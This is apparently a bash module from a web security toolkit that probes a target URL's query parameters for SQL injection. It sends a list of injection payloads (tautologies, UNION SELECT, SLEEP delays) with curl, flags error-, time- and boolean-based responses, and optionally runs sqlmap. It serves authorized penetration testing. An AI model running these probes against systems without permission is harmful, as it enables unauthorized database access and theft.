#!/bin/bash

# SQL Injection Scanner Module

source src/config.sh

# Function to scan for SQL injection vulnerabilities
sqli_scan() {
    local target="$1"
    local result_dir="$2"
    
    print_status "Starting SQL injection scan for: $target" "info"
    
    # Create output files
    output_file="$result_dir/sqli_results.txt"
    vuln_file="$result_dir/sqli_vulnerabilities.txt"
    
    {
        echo "SQL Injection Scan Results for: $target"
        echo "Generated on: $(date)"
        echo "="*60
        echo ""
        
        # Check if target is a URL
        if [[ ! $target =~ ^https?:// ]]; then
            target="http://$target"
        fi
        
        echo "METHOD 1: Basic SQLi payload testing"
        echo "------------------------------------"
        
        # Common SQLi payloads
        payloads=(
            "'"
            "''"
            "' OR '1'='1"
            "' OR '1'='1' --"
            "' OR '1'='1' /*"
            "1' ORDER BY 1--"
            "1' ORDER BY 1000--"
            "1' UNION SELECT NULL--"
            "1' AND 1=1--"
            "1' AND 1=2--"
            "1' AND SLEEP(5)--"
            "1' OR SLEEP(5)--"
        )
        
        # Test URL parameters
        echo "Testing URL parameters..." | tee -a "$output_file"
        
        # Extract URL without parameters
        base_url=$(echo "$target" | cut -d'?' -f1)
        query_string=$(echo "$target" | cut -d'?' -f2)
        
        vulnerable=false
        
        if [ ! -z "$query_string" ]; then
            IFS='&' read -ra params <<< "$query_string"
            
            for param in "${params[@]}"; do
                param_name=$(echo "$param" | cut -d'=' -f1)
                echo "  Testing parameter: $param_name" | tee -a "$output_file"
                
                for payload in "${payloads[@]}"; do
                    test_url="${base_url}?${param_name}=${payload}"
                    
                    # Send request
                    start_time=$(date +%s)
                    response=$(curl -s -L "$test_url" 2>/dev/null)
                    end_time=$(date +%s)
                    response_time=$((end_time - start_time))
                    
                    # Check for SQL errors
                    sql_errors=(
                        "SQL syntax"
                        "mysql_fetch"
                        "MySQL server"
                        "ORA-[0-9]"
                        "PostgreSQL"
                        "SQLite"
                        "Warning.*mysql"
                        "Unclosed quotation"
                        "You have an error in your SQL"
                    )
                    
                    for error in "${sql_errors[@]}"; do
                        if echo "$response" | grep -i -q "$error"; then
                            echo "    [!] SQL ERROR DETECTED: $error" | tee -a "$output_file"
                            echo "    Payload: $payload" | tee -a "$output_file"
                            echo "URL: $test_url" >> "$vuln_file"
                            echo "Error: $error" >> "$vuln_file"
                            vulnerable=true
                            break 2
                        fi
                    done
                    
                    # Check for time-based SQLi
                    if [ $response_time -ge 5 ]; then
                        echo "    [!] TIME-BASED SQLi DETECTED (delay: ${response_time}s)" | tee -a "$output_file"
                        echo "    Payload: $payload" | tee -a "$output_file"
                        echo "URL: $test_url" >> "$vuln_file"
                        echo "Type: Time-based (${response_time}s delay)" >> "$vuln_file"
                        vulnerable=true
                    fi
                    
                    # Check for boolean-based SQLi
                    normal_response=$(curl -s -L "$target" 2>/dev/null)
                    if [ ! -z "$normal_response" ] && [ ! -z "$response" ]; then
                        if [ "$normal_response" != "$response" ]; then
                            echo "    [!] BOOLEAN-BASED SQLi SUSPECTED" | tee -a "$output_file"
                            echo "    Payload: $payload" | tee -a "$output_file"
                            echo "URL: $test_url" >> "$vuln_file"
                            echo "Type: Boolean-based" >> "$vuln_file"
                            vulnerable=true
                        fi
                    fi
                done
            done
        else
            echo "  No URL parameters found" | tee -a "$output_file"
        fi
        
        echo ""
        echo "METHOD 2: Using sqlmap (if available)"
        echo "--------------------------------------"
        
        if command -v sqlmap &> /dev/null; then
            echo "Running sqlmap (basic scan)..." | tee -a "$output_file"
            sqlmap -u "$target" --batch --level=1 --risk=1 --output-dir="$result_dir/sqlmap" > "$result_dir/sqlmap_output.txt" 2>&1
            
            if grep -q "sqlmap identified" "$result_dir/sqlmap_output.txt"; then
                echo "  [!] sqlmap found vulnerabilities!" | tee -a "$output_file"
                grep -A5 "sqlmap identified" "$result_dir/sqlmap_output.txt" | tee -a "$output_file"
                
                # Extract vulnerable URLs from sqlmap
                if [ -f "$result_dir/sqlmap/output" ]; then
                    find "$result_dir/sqlmap" -name "*.txt" -exec grep -l "Parameter" {} \; | \
                        xargs cat 2>/dev/null | grep -i "vulnerable\|parameter" >> "$vuln_file"
                fi
                vulnerable=true
            else
                echo "  [✓] sqlmap found no vulnerabilities" | tee -a "$output_file"
            fi
        else
            echo "sqlmap not found. Skipping..." | tee -a "$output_file"
        fi
        
        echo ""
        echo "="*60
        echo "SCAN SUMMARY"
        echo "="*60
        
        if [ "$vulnerable" = true ]; then
            echo "[!] SQL INJECTION VULNERABILITIES FOUND!" | tee -a "$output_file"
            echo "Check $vuln_file for details" | tee -a "$output_file"
            echo "" | tee -a "$output_file"
            
            if [ -f "$vuln_file" ]; then
                echo "Vulnerable points:" | tee -a "$output_file"
                cat "$vuln_file" | tee -a "$output_file"
            fi
        else
            echo "[✓] No SQL injection vulnerabilities detected" | tee -a "$output_file"
            echo "Note: This is a basic scan. Manual testing recommended." | tee -a "$output_file"
        fi
        
    } > "$result_dir/sqli_scan.log"
    
    # Display results
    if [ -f "$vuln_file" ] && [ -s "$vuln_file" ]; then
        echo -e "\n${RED}[!] SQL injection vulnerabilities found!${NC}"
        echo -e "${CYAN}[*] Vulnerable points:${NC}"
        cat "$vuln_file" | head -10
    else
        echo -e "\n${GREEN}[✓] No SQL injection vulnerabilities found${NC}"
    fi
}

# Main execution if script called directly
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    if [ $# -lt 1 ]; then
        echo "Usage: $0 <target_url> [output_dir]"
        exit 1
    fi
    
    target="$1"
    result_dir="${2:-$RESULTS_DIR/${target}_$(date +%Y%m%d_%H%M%S)}"
    
    mkdir -p "$result_dir"
    sqli_scan "$target" "$result_dir"
fi
